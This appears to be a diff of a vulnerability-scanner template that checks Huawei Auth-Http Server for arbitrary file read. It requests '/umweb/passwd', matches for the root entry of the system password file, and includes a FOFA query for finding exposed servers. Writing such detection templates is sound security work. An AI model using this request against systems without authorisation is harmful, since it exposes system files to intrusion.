@@ -1,5 +1,4 @@
 id: huawei-authhttp-lfi
-
 info:
   name: Huawei Auth Http Server - Arbitrary File Read
   author: DhiyaneshDk
@@ -8,29 +7,28 @@ info:
   reference:
     - https://mp.weixin.qq.com/s?__biz=MzIxMTg1ODAwNw==&mid=2247498499&idx=1&sn=6850c3e9a3df795e48ba9a10c9772ddd
     - https://github.com/Vme18000yuan/FreePOC/blob/master/poc/pocsuite/huawei-auth-http-readfile.py
+  classification:
+    cwe-id:
+      - CWE-22
+      - CWE-73
   metadata:
-    verified: true
-    max-request: 1
     fofa-query: server="Huawei Auth-Http Server 1.0"
-  tags: lfi,huawei,authhttp,vuln
-
+    max-request: 1
+    verified: true
+  tags: authhttp,huawei,lfi,vuln
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/umweb/passwd"
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: header
+  - matchers:
+      - part: header
+        type: word
         words:
-          - "Huawei Auth-Http Server"
-
-      - type: regex
-        regex:
-          - "root:.*:0:0:"
-
-      - type: status
-        status:
+          - Huawei Auth-Http Server
+      - regex:
+          - 'root:.*:0:0:'
+        type: regex
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/umweb/passwd'
